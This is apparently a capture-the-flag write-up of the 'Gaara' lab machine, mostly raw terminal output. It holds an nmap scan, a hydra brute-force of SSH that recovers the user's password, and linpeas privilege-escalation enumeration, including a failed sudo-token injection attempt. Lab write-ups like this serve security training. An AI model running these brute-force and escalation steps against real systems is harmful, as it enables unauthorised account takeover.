# GAARA

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.142
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 09:16 CST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.58% done; ETC: 09:16 (0:00:17 remaining)
Nmap scan report for 192.168.213.142
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3ea36f6403331e76f8e498febee98e58 (RSA)
|   256 6c0eb500e742444865effed77ce664d5 (ECDSA)
|_  256 b751f2f9855766a865542e05f940d2f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/18%OT=22%CT=1%CU=42661%PV=Y%DS=4%DC=T%G=Y%TM=64657C9
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M
OS:551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%
OS:O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=53
OS:10%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   215.67 ms 192.168.45.1
2   215.72 ms 192.168.45.254
3   216.49 ms 192.168.251.1
4   216.63 ms 192.168.213.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.51 seconds

```

```
http://192.168.213.142/Cryoserver
/Temari
/Kazekage
/iamGaara
```

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 30 ssh://192.168.213.142
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-18 09:42:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://192.168.213.142:22/


[STATUS] 190.00 tries/min, 190 tries in 00:01h, 14344219 to do in 1258:16h, 20 active
[22][ssh] host: 192.168.213.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-18 09:43:24
```

ssh登录，gaara:iloveyou2

```
gaara@Gaara:~$ ./linpeas.sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.1.5 - Safe OSCP by carlospolop
                                                                                  
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                
                                                                                  
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist                                                                
 LEGEND:                                                                          
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════                                                                       
OS: Linux version 4.19.0-13-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.160-2 (2020-11-28)
User & Groups: uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
Hostname: Gaara
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                               
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                   
                                                                                  

Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                                            
                                                                                  
════════════════════════════════════╣ System Information ╠════════════════════════════════════                                                                      
[+] Operative system                                                              
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits   
Linux version 4.19.0-13-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.160-2 (2020-11-28)
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version      
Sudo version 1.8.27                                                               

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                        
                                                                                  
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                          
New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin

[+] Date
Wed 17 May 2023 09:47:36 PM EDT                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                  
udev            479M     0  479M   0% /dev
tmpfs            99M  4.3M   95M   5% /run
/dev/sda1       6.9G  1.8G  4.8G  27% /
tmpfs           494M     0  494M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/1001
              total        used        free      shared  buff/cache   available
Mem:        1009964       93356      686020        4648      230588      750360
Swap:        998396           0      998396

[+] CPU info
Architecture:        x86_64                                                       
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
Address sizes:       45 bits physical, 48 bits virtual
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           AuthenticAMD
CPU family:          23
Model:               1
Model name:          AMD EPYC 7371 16-Core Processor
Stepping:            2
CPU MHz:             3094.186
BogoMIPS:            6188.37
Hypervisor vendor:   VMware
Virtualization type: full
L1d cache:           32K
L1i cache:           64K
L2 cache:            512K
L3 cache:            65536K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xgetbv1 xsaves clzero arat overflow_recov succor

[+] Environment
[i] Any private information inside environment variables?                         
HISTFILESIZE=0                                                                    
MAIL=/var/mail/gaara
USER=gaara
SSH_CLIENT=192.168.45.156 58224 22
XDG_SESSION_TYPE=tty
SHLVL=1
HOME=/home/gaara
SSH_TTY=/dev/pts/0
LOGNAME=gaara
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=5
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/bash
SSH_CONNECTION=192.168.45.156 58224 192.168.213.142 22
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                 
 Not Found                                                                        
                                                                                  
[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found                                
[+] Execshield enabled? ............ Execshield Not Found                         
[+] SELinux enabled? ............... sestatus Not Found                           
[+] Is ASLR enabled? ............... Yes                                          
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (vmware)                                 
[+] Is this a container? ........... No
[+] Any running containers? ........ No                                           
                                                                                  

═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════                                                                      
[+] Any sd*/disk* disk in /dev? (limit 20)                                        
disk                                                                              
sda
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                       
UUID=baaa0c0e-f29d-4fa3-ba73-9684dd24f96a /               ext4    errors=remount-ro 0       1
UUID=5cc3cf53-ffa2-4c94-99d8-1ce00f85aa97 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


════════════════════════════════════╣ Available Software ╠════════════════════════════════════                                                                      
[+] Useful software                                                               
/usr/bin/nc                                                                       
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/gdb
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/sudo

[+] Installed Compiler
                                                                                  

══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════                                                       
[+] Cleaned processes                                                             
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                            
root         1  0.0  1.0 103948 10200 ?        Ss   21:13   0:00 /sbin/init       
root       247  0.0  1.0  40380 10312 ?        Ss   21:13   0:00 /lib/systemd/systemd-journald
root       268  0.0  0.5  22064  5120 ?        Ss   21:13   0:00 /lib/systemd/systemd-udevd
root      1475  0.0  0.2  22064  2436 ?        S    21:47   0:00  _ /lib/systemd/systemd-udevd
systemd+   410  0.0  0.6  93084  6580 ?        Ssl  21:13   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       412  0.0  1.0  48228 10692 ?        Ss   21:13   0:00 /usr/bin/VGAuthService                                                                             
root       413  0.0  1.2 122880 12284 ?        Ssl  21:13   0:01 /usr/bin/vmtoolsd
root       423  0.0  0.2   8504  2696 ?        Ss   21:13   0:00 /usr/sbin/cron -f
root       424  0.0  0.4 225960  4548 ?        Ssl  21:13   0:00 /usr/sbin/rsyslogd -n -iNONE
message+   425  0.0  0.4   8972  4336 ?        Ss   21:13   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       427  0.0  0.5  19768  5228 ?        Ss   21:13   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       428  0.0  0.7  19520  7308 ?        Ss   21:13   0:00 /lib/systemd/systemd-logind
root       553  0.0  0.1   5612  1680 tty1     Ss+  21:14   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       565  0.0  0.6  15852  6912 ?        Ss   21:14   0:00 /usr/sbin/sshd -D
gaara     1367  0.0  0.4  16928  4832 ?        S    21:44   0:00      _ sshd: gaara@pts/0
gaara     1368  0.0  0.4   7652  4496 pts/0    Ss   21:44   0:00          _ -bash
gaara     1382  0.2  0.1   2728  2000 pts/0    S+   21:47   0:00              _ /bin/sh ./linpeas.sh
gaara     2027  0.0  0.0   2728   444 pts/0    S+   21:47   0:00                  _ /bin/sh ./linpeas.sh
gaara     2031  0.0  0.3  10780  3092 pts/0    R+   21:47   0:00                  |   _ ps fauxwww
gaara     2030  0.0  0.0   2728   444 pts/0    S+   21:47   0:00                  _ /bin/sh ./linpeas.sh
root       660  0.0  0.4   8572  4868 ?        Ss   21:15   0:00 /usr/sbin/apache2 -k start
www-data  1023  0.3  0.7 756036  7116 ?        Sl   21:16   0:06  _ /usr/sbin/apache2 -k start                                                                      
www-data  1024  0.3  0.6 755892  6856 ?        Sl   21:16   0:06  _ /usr/sbin/apache2 -k start                                                                      
gaara     1358  0.0  0.8  21024  8452 ?        Ss   21:44   0:00 /lib/systemd/systemd --user
gaara     1359  0.0  0.2 105196  2428 ?        S    21:44   0:00  _ (sd-pam)

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes         
   0 lrwxrwxrwx 1 root root    4 Dec 13  2020 /bin/sh -> dash                     
1.5M -rwxr-xr-x 1 root root 1.5M Oct 24  2020 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Oct 24  2020 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Oct 24  2020 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Oct 24  2020 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Oct 24  2020 /lib/systemd/systemd-udevd
 64K -rwxr-xr-x 1 root root  64K Jan 10  2019 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Oct 24  2020 /sbin/init -> /lib/systemd/systemd
2.8M -rwxr-xr-x 1 root root 2.8M Mar 24  2020 /sbin/wpa_supplicant
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon[0m
132K -rwxr-xr-x 1 root root 129K Oct  9  2019 /usr/bin/VGAuthService
 56K -rwxr-xr-x 1 root root  56K Oct  9  2019 /usr/bin/vmtoolsd
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd

[+] Files opened by processes belonging to other users
[i] This is usually empty because of the lack of privileges to read other user processes information                                                                
COMMAND    PID  TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                     
gdm-password Not Found                                                            
gnome-keyring-daemon Not Found                                                    
lightdm Not Found                                                                 
vsftpd Not Found                                                                  
apache2 process found (dump creds from memory as root)                            
sshd: process found (dump creds from memory as root)

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                  
incrontab Not Found
-rw-r--r-- 1 root root 1042 Oct 11  2019 /etc/crontab                             

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Dec 13  2020 .
drwxr-xr-x 85 root root 4096 Apr 27  2021 ..
-rw-r--r--  1 root root  285 May 19  2019 anacron
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.daily:
total 44
drwxr-xr-x  2 root root 4096 Dec 13  2020 .
drwxr-xr-x 85 root root 4096 Apr 27  2021 ..
-rwxr-xr-x  1 root root  311 May 19  2019 0anacron
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Dec 13  2020 .
drwxr-xr-x 85 root root 4096 Apr 27  2021 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x  2 root root 4096 Dec 13  2020 .
drwxr-xr-x 85 root root 4096 Apr 27  2021 ..
-rwxr-xr-x  1 root root  313 May 19  2019 0anacron
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Dec 13  2020 .
drwxr-xr-x 85 root root 4096 Apr 27  2021 ..
-rwxr-xr-x  1 root root  312 May 19  2019 0anacron
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin



SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

[+] Services
[i] Search for outdated versions                                                  
 [ - ]  anacron                                                                   
 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  bluetooth
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  networking
 [ + ]  open-vm-tools
 [ + ]  procps
 [ + ]  rsyslog
 [ + ]  ssh
 [ - ]  sudo
 [ + ]  udev
 [ - ]  x11-common

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                         
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                 

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services          
You can't write on systemd PATH                                                   

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Wed 2023-05-17 22:33:40 EDT  46min left    Wed 2023-05-17 21:34:39 EDT  12min ago anacron.timer                anacron.service                                      
Thu 2023-05-18 00:00:00 EDT  2h 12min left Wed 2023-05-17 21:15:57 EDT  31min ago logrotate.timer              logrotate.service                                    
Thu 2023-05-18 00:00:00 EDT  2h 12min left Wed 2023-05-17 21:15:57 EDT  31min ago man-db.timer                 man-db.service                                       
Thu 2023-05-18 06:36:59 EDT  8h left       Wed 2023-05-17 21:15:57 EDT  31min ago apt-daily-upgrade.timer      apt-daily-upgrade.service                            
Thu 2023-05-18 07:45:38 EDT  9h left       Wed 2023-05-17 21:15:57 EDT  31min ago apt-daily.timer              apt-daily.service                                    
Thu 2023-05-18 21:28:33 EDT  23h left      Wed 2023-05-17 21:28:30 EDT  19min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                       

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers            
                                                                                  
[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets           
                                                                                  
[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus             
NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                                     1 systemd         root             :1.0          init.scope                -          -
:1.1                                   410 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -
:1.130                                6301 busctl          gaara            :1.130        session-5.scope           5          -
:1.3                                   427 wpa_supplicant  root             :1.3          wpa_supplicant.service    -          -
:1.4                                   428 systemd-logind  root             :1.4          systemd-logind.service    -          -
:1.62                                 1358 systemd         gaara            :1.62         user@1001.service         -          -
fi.epitest.hostap.WPASupplicant        427 wpa_supplicant  root             :1.3          wpa_supplicant.service    -          -
fi.w1.wpa_supplicant1                  427 wpa_supplicant  root             :1.3          wpa_supplicant.service    -          -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -          -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
org.freedesktop.login1                 428 systemd-logind  root             :1.4          systemd-logind.service    -          -
org.freedesktop.network1                 - -               -                (activatable) -                         -
org.freedesktop.resolve1                 - -               -                (activatable) -                         -
org.freedesktop.systemd1                 1 systemd         root             :1.0          init.scope                -          -
org.freedesktop.timedate1                - -               -                (activatable) -                         -
org.freedesktop.timesync1              410 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -


═══════════════════════════════════╣ Network Information ╠════════════════════════════════════                                                                      
[+] Hostname, hosts and DNS                                                       
Gaara                                                                             
127.0.0.1       localhost
127.0.1.1       debian

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 192.168.213.254
dnsdomainname Not Found
                                                                                  
[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                         
                                                                                  
[+] Interfaces
default         0.0.0.0                                                           
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ba:2c:57 brd ff:ff:ff:ff:ff:ff
    inet 192.168.213.142/24 brd 192.168.213.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feba:2c57/64 scope link 
       valid_lft forever preferred_lft forever

[+] Networks and neighbours
192.168.213.254 dev ens192 lladdr 00:50:56:ba:07:c8 REACHABLE                     
IP address       HW type     Flags       HW address            Mask     Device
192.168.213.254  0x1         0x2         00:50:56:ba:07:c8     *        ens192

[+] Iptables rules
iptables rules Not Found                                                          
                                                                                  
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports        
                                                                                  
[+] Can I sniff with tcpdump?
No                                                                                
                                                                                  

════════════════════════════════════╣ Users Information ╠════════════════════════════════════                                                                       
[+] My user                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users             
uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)                                

[+] Do I have PGP keys?
gpg Not Found                                                                     
netpgpkeys Not Found                                                              
netpgp Not Found                                                                  
                                                                                  
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                          
                                                                                  
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
                                                                                  
[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                 
/proc/sys/kernel/yama/ptrace_scope is enabled (0)                                 
gdb was found in PATH
Checking for sudo tokens in other shells owned by current user
Injecting process 1368 -> bash
The escalation didn't work... (try again later?)

[+] Checking doas.conf
/etc/doas.conf Not Found                                                          
                                                                                  
[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                             
                                                                                  
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                   

[+] Users with console
gaara:x:1001:1001:,,,:/home/gaara:/bin/bash                                       
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                            
uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=105(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 21:47:42 up 34 min,  1 user,  load average: 1.11, 0.25, 0.08                     
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
gaara    pts/0    192.168.45.156   21:44   14.00s  0.02s  0.00s w

[+] Last logons
gaara    pts/0        Wed May 17 21:44:33 2023   still logged in                       192.168.45.156
reboot   system boot  Fri Feb 17 12:19:35 2023   still running                         0.0.0.0
reboot   system boot  Thu Feb 16 03:00:23 2023   still running                         0.0.0.0
